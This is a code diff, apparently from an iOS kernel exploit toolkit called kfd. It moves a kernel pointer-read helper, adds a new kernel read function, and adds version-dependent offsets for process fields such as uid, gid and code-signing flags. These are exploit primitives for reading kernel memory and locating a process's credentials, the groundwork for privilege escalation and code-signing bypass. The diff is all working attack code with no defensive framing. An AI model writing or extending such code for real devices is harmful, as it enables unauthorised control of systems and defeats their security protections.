@@ -202,16 +202,6 @@ uint64_t kread64_kfd(uint64_t va) {
     return u;
 }
 
-uint64_t kread64_ptr_kfd(uint64_t kaddr) {
-    uint64_t ptr = kread64_kfd(kaddr);
-    if ((ptr >> 55) & 1) {
-        return ptr | 0xffffff8000000000;
-    }
-
-    return ptr;
-}
-
-
 uint32_t kread32_kfd(uint64_t va) {
     union {
         uint32_t u32[2];
@@ -273,6 +263,24 @@ void kwrite8_kfd(uint64_t va, uint8_t val) {
     u.u64 = kread64_kfd(va);
     u.u8[0] = val;
     kwrite64_kfd(va, u.u64);
+}
+
+uint64_t kread64_ptr_kfd(uint64_t va) {
+    uint64_t ptr = kread64_kfd(va);
+    if ((ptr >> 55) & 1) {
+        return ptr | 0xffffff8000000000;
+    }
+
+    return ptr;
+}
+
+//Thanks @jmpews
+uint64_t kread64_smr_kfd(uint64_t va)
+{
+    uint64_t value = kread64_kfd(va) | 0xffffff8000000000;
+    if((value & 0x400000000000) != 0)
+        value &= 0xFFFFFFFFFFFFFFE0;
+    return value;
 }
 
 uint64_t get_kernel_proc(void) {
@@ -402,6 +410,14 @@ uint64_t off_ipc_space_is_table     = 0;
 uint64_t off_ipc_entry_ie_object    = 0;
 uint64_t off_ipc_port_ip_kobject    = 0x48;
 
+uint64_t off_p_csflags  = 0x1c;
+uint64_t off_p_uid      = 0x2c;
+uint64_t off_p_gid      = 0x30;
+uint64_t off_p_ruid     = 0x34;
+uint64_t off_p_rgid     = 0x38;
+uint64_t off_proc_proc_ro = 0x18;
+uint64_t off_task_t_flags = 0x3e8;
+
 void offset_exporter(void) {
     struct kfd* kfd = ((struct kfd*)_kfd);
     off_pmap_tte = static_offsetof(pmap, tte);
@@ -415,6 +431,13 @@ void offset_exporter(void) {
     off_ipc_entry_ie_object = static_offsetof(ipc_entry, ie_object);
     
     if(kfd->info.env.vid <= 7) {
+        off_proc_proc_ro        = 0x20;
+    }
+    if(kfd->info.env.vid <= 5) {
         off_ipc_port_ip_kobject = 0x58;
+        off_p_csflags = 0x300;
+    }
+    if(kfd->info.env.vid <= 3) {
+        off_task_itk_space = 0x330;
     }
 }
